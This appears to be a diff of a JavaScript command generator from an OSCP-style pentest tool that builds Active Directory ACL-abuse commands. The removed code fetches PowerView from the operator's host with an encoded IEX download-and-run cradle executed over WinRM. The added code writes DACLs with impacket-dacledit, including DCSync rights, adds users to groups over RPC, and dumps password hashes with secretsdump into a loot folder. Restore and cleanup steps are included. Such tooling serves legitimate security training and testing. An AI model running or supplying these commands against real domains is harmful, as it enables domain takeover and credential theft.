@@ -8,50 +8,32 @@ const canonicalRight = (value) => {
   return rights.get(String(value || "").trim().toLowerCase()) || "";
 };
 
-const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
-const powerShellQuote = (value) => `'${String(value).replaceAll("'", "''")}'`;
-const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();
-const renderValues = (template, variables) => template.replace(/\{\{([a-zA-Z0-9_]+)\}\}/g, (match, key) => (
-  variables[key] === undefined || variables[key] === null || variables[key] === ""
-    ? match
-    : String(variables[key])
-));
+const impacketRights = new Map([
+  ["All", "FullControl"],
+  ["ResetPassword", "ResetPassword"],
+  ["WriteMembers", "WriteMembers"],
+  ["DCSync", "DCSync"],
+]);
 
-const utf16leBase64 = (value) => {
-  const bytes = new Uint8Array(value.length * 2);
-  for (let index = 0; index < value.length; index += 1) {
-    const code = value.charCodeAt(index);
-    bytes[index * 2] = code & 0xff;
-    bytes[(index * 2) + 1] = code >> 8;
-  }
-  let binary = "";
-  for (let offset = 0; offset < bytes.length; offset += 0x8000) {
-    binary += String.fromCharCode(...bytes.subarray(offset, offset + 0x8000));
-  }
-  return btoa(binary);
+const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
+const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();
+
+const impacketAuth = (variables) => {
+  const account = `${variableValue(variables, "domain")}/${variableValue(variables, "user")}`;
+  if (String(variables.password || "").trim()) return shellQuote(`${account}:${variables.password}`);
+  return `-hashes ${shellQuote(`:${variableValue(variables, "hash")}`)} ${shellQuote(account)}`;
 };
 
-const principalSid = (credentialArg) => `$PrincipalObject = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Properties objectSid${credentialArg}; if (-not $PrincipalObject) { throw 'ACL principal {{aclPrincipal}} was not found in {{domain}}' }; $PrincipalSidValue = @($PrincipalObject.objectSid)[0]; if ($PrincipalSidValue -is [byte[]]) { $PrincipalSid = (New-Object System.Security.Principal.SecurityIdentifier($PrincipalSidValue, 0)).Value } elseif ($PrincipalSidValue -and $PrincipalSidValue.PSObject.Properties['Value']) { $PrincipalSid = [string]$PrincipalSidValue.Value } else { $PrincipalSid = [string]$PrincipalSidValue }; if ($PrincipalSid -notmatch '^S-1-') { throw ('ACL principal resolved to an invalid SID: ' + $PrincipalSid) }`;
-const aclQuery = (credentialArg) => `Get-DomainObjectAcl -Identity $ResolvedTarget -Domain '{{domain}}' -ResolveGUIDs${credentialArg} | Where-Object { $AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; $AceSid -eq $PrincipalSid }`;
-const baselinePath = "$BaselinePath = Join-Path $env:TEMP 'oscp-acl-before.xml'";
-const aclColumns = "SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,AceQualifier,AccessMask,IsInherited";
-const aclKey = "$AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; '{0}|{1}|{2}|{3}|{4}|{5}|{6}' -f $AceSid,[string]$_.ActiveDirectoryRights,[string]$_.ObjectAceType,[string]$_.AceType,[string]$_.AceQualifier,[string]$_.AccessMask,[string]$_.IsInherited";
-const snapshot = (rows, keys) => `${keys} = @('__ACL_BASELINE__') + @(${rows} | Where-Object { $null -ne $_ } | ForEach-Object { ${aclKey} })`;
-const compareAcl = `${snapshot("$Current", "$CurrentKeys")}; $Diff = @(Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys)`;
+const sambaAuth = (variables) => {
+  const account = `${variableValue(variables, "domain")}/${variableValue(variables, "user")}`;
+  if (String(variables.password || "").trim()) return `-U ${shellQuote(`${account}%${variables.password}`)}`;
+  return `-U ${shellQuote(`${account}%${variableValue(variables, "hash")}`)} --pw-nt-hash`;
+};
 
-const winrmIdentity = (variables) => `-d ${shellQuote(variableValue(variables, "domain"))} -u ${shellQuote(variableValue(variables, "user"))}`;
-const winrmAuth = (variables) => String(variables.password || "").trim()
-  ? `-p ${shellQuote(variables.password)}`
-  : `-H ${shellQuote(variableValue(variables, "hash"))}`;
-
-const powerViewHost = "pv='{{powerViewPath}}'; pv_url='http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; pv_log='{{workspaceRoot}}/{{targetName}}/notes/powerview-http.log'; pv_probe=$(mktemp); trap 'rm -f \"$pv_probe\"' EXIT; test -f \"$pv\" || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; exit 1; }; mkdir -p \"$(dirname \"$pv_log\")\"; if ! curl -fsS --max-time 2 -o \"$pv_probe\" \"$pv_url\" || ! grep -qi 'function Get-DomainObjectAcl' \"$pv_probe\"; then (cd \"$(dirname \"$pv\")\" && nohup python3 -m http.server {{powerViewPort}} --bind {{lhost}} >\"$pv_log\" 2>&1 &); sleep 1; fi; if ! curl -fsS --max-time 2 -o \"$pv_probe\" \"$pv_url\" || ! grep -qi 'function Get-DomainObjectAcl' \"$pv_probe\"; then echo \"PowerView HTTP staging failed at $pv_url; choose a free POWER VIEW HTTP PORT and inspect $pv_log\"; tail -n 20 \"$pv_log\" 2>/dev/null; exit 1; fi";
-
-const remotePowerView = (script, variables, actionName) => {
-  const loader = "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue'; $PowerViewUrl = 'http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; try { IEX((New-Object Net.WebClient).DownloadString($PowerViewUrl)) } catch { throw ('PowerView download or load failed from ' + $PowerViewUrl + ': ' + $_.Exception.Message) }";
-  const document = `# Generated by Fieldnotes OSCP\n# Action: ${actionName}\n# Contains the selected credential for explicit LDAP authentication; local copy is mode 600.\n\n${loader};\n\n${script}\n`;
-  const payload = utf16leBase64(renderValues(document, variables));
-  const scriptPath = `{{workspaceRoot}}/{{targetName}}/notes/powershell/${actionName}.ps1`;
-  return `${powerViewHost}; script_path='${scriptPath}'; mkdir -p \"$(dirname \"$script_path\")\"; printf '%s' '${payload}' | base64 -d | iconv -f UTF-16LE -t UTF-8 >\"$script_path\"; chmod 600 \"$script_path\"; echo \"[*] Generated PowerShell: $script_path\"; nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)} -X \"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand ${payload}\"`;
+const targetArgument = (right, variables) => {
+  const target = right === "DCSync" ? variableValue(variables, "baseDn") : variableValue(variables, "aclTarget");
+  const option = right === "DCSync" || /(^|,)\s*(?:CN|OU|DC)=/i.test(target) ? "-target-dn" : "-target";
+  return `${option} ${shellQuote(target)}`;
 };
 
 export function buildAclCommands(variables = {}) {
@@ -59,10 +41,11 @@ export function buildAclCommands(variables = {}) {
   if (!right) {
     return [{
       key: "acl-invalid-right",
-      label: "Choose a supported PowerView ACL right",
+      label: "Choose a supported Impacket ACL right",
       value: "printf '%s\\n' 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync' >&2; false",
     }];
   }
+
   const target = String(variables.aclTarget || "selected target").trim();
   const principal = String(variables.aclPrincipal || "selected principal").trim();
   const validDcsyncTargets = [variables.domain, variables.baseDn]
@@ -76,53 +59,62 @@ export function buildAclCommands(variables = {}) {
       value: `printf '%s\\n' ${shellQuote(`DCSync must be granted on the domain object. Set ACL TARGET to ${variables.domain || variables.baseDn}, not ${target}.`)} >&2; false`,
     }];
   }
-  const targetIdentity = right === "DCSync" ? "{{baseDn}}" : "{{aclTarget}}";
-  const useExplicitCredential = Boolean(String(variables.password || "").trim());
-  const credentialArg = useExplicitCredential ? " -Credential $Cred" : "";
-  const credentialSetup = useExplicitCredential
-    ? `$SecurePassword = ConvertTo-SecureString ${powerShellQuote(variables.password)} -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(${powerShellQuote(`${variables.domain}\\${variables.user}`)}, $SecurePassword)`
-    : "";
-  const authenticated = (script) => credentialSetup ? `${credentialSetup}; ${script}` : script;
-  const targetResolver = `$TargetObjects = @(Get-DomainObject -Identity '${targetIdentity}' -Domain '{{domain}}' -Properties distinguishedName${credentialArg}); if ($TargetObjects.Count -ne 1) { throw ('Expected one ACL target for ${targetIdentity}, resolved ' + $TargetObjects.Count) }; $ResolvedTarget = [string]$TargetObjects[0].distinguishedName; if (-not $ResolvedTarget) { throw 'Resolved ACL target has no distinguished name' }`;
-  const query = aclQuery(credentialArg);
+
+  const auth = impacketAuth(variables);
+  const targetArg = targetArgument(right, variables);
+  const principalArg = `-principal ${shellQuote(variableValue(variables, "aclPrincipal"))}`;
+  const dcArg = `-dc-ip ${shellQuote(variableValue(variables, "rhost"))}`;
+  const rightArg = impacketRights.get(right);
+  const slug = right.toLowerCase();
+  const daclDir = "{{workspaceRoot}}/{{targetName}}/loot/dacl";
+  const beforePath = `${daclDir}/${slug}-before.txt`;
+  const afterPath = `${daclDir}/${slug}-after.txt`;
+  const latestBackup = `${daclDir}/${slug}-latest-backup.txt`;
   const identity = `${right}: ${principal} -> ${target}`;
-  const commands = [
+  const commands = [];
+
+  const group = String(variables.targetGroup || "").trim();
+  const member = String(variables.memberUser || variables.aclPrincipal || variables.user || "").trim();
+  if (group) {
+    const groupArg = shellQuote(group);
+    const memberArg = shellQuote(member || "{{memberUser}}");
+    const rpcBase = `-S ${shellQuote(variableValue(variables, "rhost"))} ${sambaAuth(variables)}`;
+    commands.push(
+      {
+        key: "acl-group-members-before",
+        label: `Confirm direct members of ${group}`,
+        value: `net rpc group members ${groupArg} ${rpcBase}`,
+      },
+      {
+        key: "acl-group-add-member",
+        label: `Add ${member || "selected member"} to ${group}`,
+        value: `net rpc group addmem ${groupArg} ${memberArg} ${rpcBase}`,
+      },
+      {
+        key: "acl-group-members-after",
+        label: `Verify ${member || "selected member"} in ${group}`,
+        value: `net rpc group members ${groupArg} ${rpcBase}`,
+      },
+    );
+  }
+
+  commands.push(
     {
-      key: "acl-winrm-check",
-      label: `WinRM: test ${principal}'s remote access`,
-      value: `nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)}`,
-    },
-    {
-      key: "acl-evil-winrm",
-      label: "Evil-WinRM: open an interactive PowerView fallback",
-      value: `evil-winrm -i {{rhost}} -u ${shellQuote(`${variableValue(variables, "domain")}\\${variableValue(variables, "user")}`)} ${winrmAuth(variables)} -s \"$(dirname '{{powerViewPath}}')\"`,
-    },
-    {
-      key: "acl-powerview-check",
-      label: "PowerView over WinRM: confirm required functions",
-      value: remotePowerView("$RequiredFunctions = @('Get-DomainObject','Get-DomainObjectAcl','Get-DomainGroup','Add-DomainObjectAcl','Remove-DomainObjectAcl'); $MissingFunctions = @($RequiredFunctions | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) }); if ($MissingFunctions.Count) { throw ('PowerView is missing required functions: ' + ($MissingFunctions -join ', ')) }; 'PowerView loaded successfully from ' + $PowerViewUrl; Get-Command $RequiredFunctions | Select-Object Name,CommandType", variables, "confirm-powerview"),
-    },
-    {
-      key: "acl-effective-groups",
-      label: `PowerView over WinRM: list ${variables.user || "authenticating user"}'s effective groups`,
-      value: remotePowerView(authenticated(`$EffectiveGroups = @(Get-DomainGroup -MemberIdentity '{{user}}' -Domain '{{domain}}' -Properties samAccountName,distinguishedName${credentialArg}); 'Effective groups for {{domain}}\\{{user}}:'; $EffectiveGroups | Sort-Object samAccountName | Select-Object samAccountName,distinguishedName | Format-Table -AutoSize`), variables, "list-effective-groups"),
-    },
-    {
-      key: "acl-capture-before",
-      label: `Capture current ACL — ${identity}`,
-      value: remotePowerView(authenticated(`${principalSid(credentialArg)}; ${targetResolver}; ${baselinePath}; $Before = @(${query}); ${snapshot("$Before", "$BeforeKeys")}; $BeforeKeys | Export-Clixml -Path $BaselinePath; 'Resolved principal SID: ' + $PrincipalSid; 'Resolved ACL target: ' + $ResolvedTarget; 'Captured ' + $Before.Count + ' matching ACL entries to ' + $BaselinePath; if ($Before.Count) { $Before | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE existed before the grant; an empty baseline is valid' }`), variables, "capture-acl-before"),
+      key: "acl-read-before",
+      label: `Read target DACL before ${right}`,
+      value: `mkdir -p ${shellQuote(daclDir)}; impacket-dacledit -action read ${principalArg} ${targetArg} ${dcArg} ${auth} | tee ${shellQuote(beforePath)}`,
     },
     {
       key: "acl-grant",
       label: `Grant ${right} — ${principal} on ${target}`,
-      value: remotePowerView(authenticated(`${targetResolver}; 'Resolved ACL target: ' + $ResolvedTarget; Add-DomainObjectAcl -TargetIdentity $ResolvedTarget -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}'${credentialArg} -Verbose; ${principalSid(credentialArg)}; $GrantedEntries = @(${query}); if (-not $GrantedEntries.Count) { throw 'PowerView returned without persisting an ACL entry. Confirm the authenticating identity has WriteDACL on the resolved target and that any required group membership is active.' }; 'Persisted ACL entries for ' + $PrincipalSid + ':'; $GrantedEntries | Select-Object ${aclColumns} | Format-Table -AutoSize`), variables, `grant-${right.toLowerCase()}`),
+      value: `dacl_dir=${shellQuote(daclDir)}; mkdir -p "$dacl_dir"; stamp=$(date +%Y%m%d-%H%M%S); backup="$dacl_dir/${slug}-before-$stamp.bak"; grant_log="$dacl_dir/${slug}-grant-$stamp.log"; impacket-dacledit -action write -rights ${shellQuote(rightArg)} ${principalArg} ${targetArg} ${dcArg} -file "$backup" ${auth} 2>&1 | tee "$grant_log"; status=\${PIPESTATUS[0]}; test "$status" -eq 0 && grep -Fq 'DACL modified successfully!' "$grant_log" || { echo 'DACL modification was not confirmed'; exit 1; }; printf '%s\\n' "$backup" >${shellQuote(latestBackup)}`,
     },
     {
       key: "acl-verify-grant",
-      label: `Review granted ACL change — ${identity}`,
-      value: remotePowerView(authenticated(`${principalSid(credentialArg)}; ${targetResolver}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${query}); ${compareAcl}; $Added = @($Diff | Where-Object SideIndicator -eq '=>'); 'Resolved principal SID: ' + $PrincipalSid; 'Resolved ACL target: ' + $ResolvedTarget; if ($Current.Count) { $Current | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE currently exists for the principal' }; if (-not $Added.Count) { throw 'No added ACL entry was detected relative to the captured baseline' }; 'Added normalized ACL entries:'; $Added | Format-Table InputObject,SideIndicator -AutoSize`), variables, "verify-acl-grant"),
+      label: `Read target DACL after ${right}`,
+      value: `mkdir -p ${shellQuote(daclDir)}; impacket-dacledit -action read ${principalArg} ${targetArg} ${dcArg} ${auth} | tee ${shellQuote(afterPath)}`,
     },
-  ];
+  );
 
   if (right === "DCSync") {
     commands.push({
@@ -138,29 +130,31 @@ export function buildAclCommands(variables = {}) {
         {
           key: "acl-dcsync-impacket-password",
           label: `Impacket DCSync with ${principal}'s password`,
-          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
+          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
         },
         {
           key: "acl-dcsync-impacket-hash",
           label: `Impacket DCSync with ${principal}'s NT hash`,
-          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
+          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
         },
       );
     }
   }
 
-  commands.push(
-    {
-      key: "acl-cleanup",
-      label: `Cleanup ${right} — ${principal} on ${target}`,
-      value: remotePowerView(authenticated(`${targetResolver}; 'Resolved ACL target: ' + $ResolvedTarget; Remove-DomainObjectAcl -TargetIdentity $ResolvedTarget -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}'${credentialArg} -Verbose`), variables, `cleanup-${right.toLowerCase()}`),
-    },
-    {
-      key: "acl-verify-cleanup",
-      label: `Verify ACL restoration — ${identity}`,
-      value: remotePowerView(authenticated(`${principalSid(credentialArg)}; ${targetResolver}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${query}); ${compareAcl}; if ($Diff.Count) { $Diff | Format-Table InputObject,SideIndicator -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { Remove-Item -Path $BaselinePath -Force; 'ACL cleanup matches the captured baseline; removed ' + $BaselinePath }`), variables, "verify-acl-cleanup"),
-    },
-  );
+  commands.push({
+    key: "acl-cleanup",
+    label: `Restore DACL backup — ${identity}`,
+    value: `backup_pointer=${shellQuote(latestBackup)}; test -s "$backup_pointer" || { echo 'No recorded DACL backup was found'; exit 1; }; backup=$(head -n1 "$backup_pointer"); test -f "$backup" || { echo "DACL backup not found: $backup"; exit 1; }; impacket-dacledit -action restore -file "$backup" ${dcArg} ${auth}`,
+  });
+
+  if (group) {
+    const rpcBase = `-S ${shellQuote(variableValue(variables, "rhost"))} ${sambaAuth(variables)}`;
+    commands.push({
+      key: "acl-group-remove-member",
+      label: `Cleanup: remove ${member || "selected member"} from ${group}`,
+      value: `net rpc group delmem ${shellQuote(group)} ${shellQuote(member || "{{memberUser}}")} ${rpcBase}`,
+    });
+  }
 
   return commands;
 }
